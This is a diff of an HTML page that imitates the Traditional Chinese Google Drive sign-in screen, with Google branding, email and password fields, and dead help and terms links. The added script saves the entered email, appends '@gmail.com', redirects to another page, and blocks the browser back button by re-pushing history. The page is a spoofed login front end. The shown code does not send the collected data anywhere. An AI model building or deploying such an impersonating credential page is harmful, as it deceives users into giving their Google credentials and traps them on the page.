@@ -1,178 +1,144 @@
 <!doctype html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <meta http-equiv="X-UA-Compatible" content="ie=edge">
-            <title>Google 雲端硬碟 : 登錄</title>
-            <link rel="stylesheet" href="style.css">
-        </head>
-        <body>
-        <div class="login-container">
-            <img src="image/google_icon.png" alt="google_icon" id="google_icon">
-            <div class="login-content">
-                <h1>登入</h1>
-                <p>繼續使用 Google 雲端硬碟</p>
-            </div>
-            <div class="input-field">
-                <div class="input-field-left">
-                    <input type="email" id="email" required autofocus placeholder="">
-                    <label for="email">電子郵件地址或電話號碼</label>
-                    <p class="null-email">請輸入電子郵件地址或電話號碼</p>
-                    <p>
-                        <a href="clown.html" class="link">忘記電子郵件地址？</a>
-                    </p>
-                    <p class="info"  style="margin-top: 50px;">
-                        如果這不是你的電腦，請使用訪客模式以私密方式登入。
-                        <a href="clown.html" class="link">進一步瞭解如何使用訪客模式</a>
-                    </p>
-                </div>
-                <div class="input-field-right">
-                    <input type="password" id="password" required placeholder="">
-                    <label for="password">輸入你的密碼</label>
-                    <div class="show-password">
-                        <input type="checkbox" id="showPasswordCheckbox">
-                        <p>顯示密碼</p>
-                    </div>
-                </div>
-            </div>
-
-            <div class="bottom-actions">
-                <p class="create-account"><a href="clown.html" class="link">建立帳戶</a></p>
-                <button class="next-step">下一步</button>
-            </div>
-            <div class="navbar">
-                <div class="language-selector">
-                    <select>
-                        <option selected>繁體中文</option>
-                    </select>
-                </div>
-                <div class="nav-links">
-                    <a href="clown.html" class="link">說明</a>
-                    <a href="clown.html" class="link">隱私權設定</a>
-                    <a href="clown.html" class="link">條款</a>
-                </div>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Google 雲端硬碟 : 登錄</title>
+    <link rel="icon" href="image/google_icon.png" type="image/png">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="login-container">
+    <img src="image/google_icon.png" alt="google_icon" id="google_icon">
+    <div class="login-content">
+        <h1>登入</h1>
+        <p>繼續使用 Google 雲端硬碟</p>
+    </div>
+    <div class="input-field">
+        <div class="input-field-left">
+            <input type="email" id="email" required autofocus placeholder="">
+            <label for="email">電子郵件地址或電話號碼</label>
+            <p class="null-email">請輸入電子郵件地址或電話號碼</p>
+            <p>
+                <a href="loading.html" class="link">忘記電子郵件地址？</a>
+            </p>
+            <p class="info" style="margin-top: 50px; font-size: 14px;">
+                如果這不是你的電腦，請使用訪客模式以私密方式登入。
+                <a href="loading.html" class="link">進一步瞭解如何使用訪客模式</a>
+            </p>
+        </div>
+        <div class="input-field-right">
+            <input type="password" id="password" required placeholder="">
+            <label for="password">輸入你的密碼</label>
+            <div class="show-password">
+                <input type="checkbox" id="showPasswordCheckbox">
+                <p>顯示密碼</p>
             </div>
         </div>
+    </div>
 
-        <script>
-            // 輔助函數，用於準備離開 index.html 時設置或清除標記
-            function prepareToLeaveIndex(isGoingToPassword) {
-                if (!isGoingToPassword) {
-                    localStorage.setItem('clearEmailOnNextIndexLoad', 'true');
-                } else {
-                    localStorage.removeItem('clearEmailOnNextIndexLoad');
-                }
+    <div class="bottom-actions">
+        <p class="create-account"><a href="loading.html" class="link">建立帳戶</a></p>
+        <button class="next-step">下一步</button>
+    </div>
+    <div class="navbar">
+        <div class="language-selector">
+            <select>
+                <option selected>繁體中文</option>
+            </select>
+        </div>
+        <div class="nav-links">
+            <a href="loading.html" class="link">說明</a>
+            <a href="loading.html" class="link">隱私權設定</a>
+            <a href="loading.html" class="link">條款</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // 检查是否是页面刷新，如果是，清除所有相关的sessionStorage数据
+        const performanceEntries = performance.getEntriesByType('navigation');
+        if ((performanceEntries.length > 0 && performanceEntries[0].type === 'reload') ||
+            (document.referrer === document.location.href)) {
+            // 清除所有相关的sessionStorage数据
+            sessionStorage.removeItem('userEmail');
+            sessionStorage.removeItem('fromIndexPage');
+            sessionStorage.removeItem('currentPage');
+        }
+
+        // 获取DOM元素
+        const emailInput = document.querySelector('#email');
+        const nextButton = document.querySelector('.next-step');
+        const enterEmailMsg = document.querySelector('.null-email');
+
+        // 检查sessionStorage中是否有保存的邮箱并回填
+        const savedEmail = sessionStorage.getItem('userEmail');
+        if (savedEmail && emailInput) {
+            emailInput.value = savedEmail;
+            // 当输入框有值时应用样式，使标签上浮
+            if (emailInput.value.trim() !== '') {
+                emailInput.classList.add('filled');
+            }
+        }
+
+        // 添加历史记录点，用于监听返回按钮
+        history.pushState({page: 'index'}, 'index', null);
+
+        // 设置当前页面标记
+        sessionStorage.setItem('currentPage', 'index');
+
+        // 禁止浏览器返回按钮
+        window.addEventListener('popstate', function(event) {
+            // 不管是什么情况，都阻止返回行为
+            history.pushState(null, null, document.URL);
+        });
+
+        nextButton.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (!emailInput.value.trim()) {
+                enterEmailMsg.style.display = 'block';
+                emailInput.classList.add('error');
+                return;
+            }
+            enterEmailMsg.style.display = 'none';
+            emailInput.classList.remove('error');
+
+            // 获取用户输入的邮箱
+            let email = emailInput.value.trim();
+
+            // 检查邮箱是否包含@gmail.com，如果没有则自动添加
+            if (!email.includes('@gmail.com') && !email.includes('@')) {
+                email += '@gmail.com';
             }
 
-            document.addEventListener('DOMContentLoaded', function() {
-                const container = document.querySelector('.input-field');
-                const emailInput = document.querySelector('#email');
+            // 保存邮箱到会话存储
+            sessionStorage.setItem('userEmail', email);
 
-                const wasBfcacheReload = sessionStorage.getItem('isBfcacheReload') === 'true';
-                sessionStorage.removeItem('isBfcacheReload'); // 使用後立即清除標記
+            // 设置一个标记，表示用户从index页面前往password页面
+            sessionStorage.setItem('fromIndexPage', 'true');
 
-                let isUserInitiatedPageRefresh = false;
-                const navigationEntries = performance.getEntriesByType("navigation");
-                if (navigationEntries && navigationEntries.length > 0) {
-                    // 判斷是否為使用者在 index.html 上直接刷新 (F5, Ctrl+R, etc.)
-                    // 條件：導航類型為 'reload' 且不是由 bfcache 恢復後觸發的 reload
-                    if (navigationEntries[0].type === 'reload' && !wasBfcacheReload) {
-                        isUserInitiatedPageRefresh = true;
-                    }
-                } else if (performance.navigation && performance.navigation.type === performance.navigation.TYPE_RELOAD && !wasBfcacheReload) {
-                    // 備用方案，適用於不支援 PerformanceNavigationTiming 的舊瀏覽器
-                    isUserInitiatedPageRefresh = true;
-                }
+            // 跳转到slide-right.html
+            window.location.href = 'slide-right.html';
+        });
 
-                if (isUserInitiatedPageRefresh) {
-                    // 如果是使用者在 index.html 內部進行的重新載入
-                    localStorage.removeItem('userEmail');
-                    localStorage.removeItem('clearEmailOnNextIndexLoad'); // 同時清除此標記
-                    emailInput.value = '';
-                } else {
-                    // 正常流程：從其他頁面導航過來，或 bfcache 恢復後的 reload
-                    const shouldClearEmail = localStorage.getItem('clearEmailOnNextIndexLoad');
-                    if (shouldClearEmail === 'true') {
-                        localStorage.removeItem('userEmail');
-                        emailInput.value = '';
-                        localStorage.removeItem('clearEmailOnNextIndexLoad'); // 使用後清除標記
-                    } else {
-                        // 若非標記清除，則嘗試從 localStorage 回填 email
-                        // 這適用於從 password.html 返回且 password.html 有 email 記錄的情況
-                        const savedEmail = localStorage.getItem('userEmail');
-                        if (savedEmail) {
-                            emailInput.value = savedEmail;
-                        } else {
-                            emailInput.value = ''; // 確保若無記錄則為空
-                        }
-                    }
-                }
+        emailInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                nextButton.click();
+            }
+        });
 
-                // 強制聚焦到 email 欄位
-                emailInput.focus();
-
-                // 初始动画
-                container.classList.remove('slide-right');
-                window.requestAnimationFrame(() => {
-                    container.classList.add('slide-right');
-                });
-
-                const nextButton = document.querySelector('.next-step');
-                nextButton.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    const email = emailInput.value;
-                    const enterEmailMsg = document.querySelector('.null-email');
-
-                    if (!email.trim()) {
-                        enterEmailMsg.style.display = 'block';
-                        emailInput.classList.add('error');
-                        return;
-                    }
-
-                    enterEmailMsg.style.display = 'none';
-                    emailInput.classList.remove('error');
-                    localStorage.setItem('userEmail', email); // 保存 email 到 localStorage
-                    prepareToLeaveIndex(true); // 標記我們要去 password.html
-                    document.querySelector('.input-field').classList.add('slide-left');
-                    setTimeout(() => window.location.href = 'password.html', 400);
-                });
-
-                emailInput.addEventListener('keydown', function(e) {
-                    if (e.key === 'Enter') {
-                        e.preventDefault();
-                        nextButton.click();
-                    }
-                });
-
-                // 為頁面中其他會導致跳轉的連結加上事件監聽器
-                document.querySelectorAll('a[href]').forEach(link => {
-                    if (!link.closest('.next-step')) { // 排除「下一步」按鈕中的連結
-                        let isLinkToPassword = false;
-                        try {
-                            isLinkToPassword = new URL(link.href, window.location.origin).pathname.endsWith('/password.html');
-                        } catch (err) {
-                            // 忽略無效的 URL
-                        }
-
-                        if (!isLinkToPassword) {
-                            link.addEventListener('click', function() {
-                                prepareToLeaveIndex(false); // 標記我們要去「其他頁面」
-                            });
-                        }
-                    }
-                });
-            });
-
-            window.addEventListener('pageshow', function(event) {
-                // 如果頁面是從 bfcache (往返快取) 中載入的
-                if (event.persisted) {
-                    // 設置一個 sessionStorage 標記，以便 DOMContentLoaded 知道這次 reload 是由 bfcache 恢復觸發的
-                    sessionStorage.setItem('isBfcacheReload', 'true');
-                    // 重新載入頁面，這樣 DOMContentLoaded 會再次觸發，相關邏輯會執行
-                    location.reload();
-                }
-            });
-        </script>
-        </body>
-        </html>
+        // 监听input事件，处理输入框样式
+        emailInput.addEventListener('input', function() {
+            if (this.value.trim() !== '') {
+                this.classList.add('filled');
+            } else {
+                this.classList.remove('filled');
+            }
+        });
+    });
+</script>
+</body>
+</html>
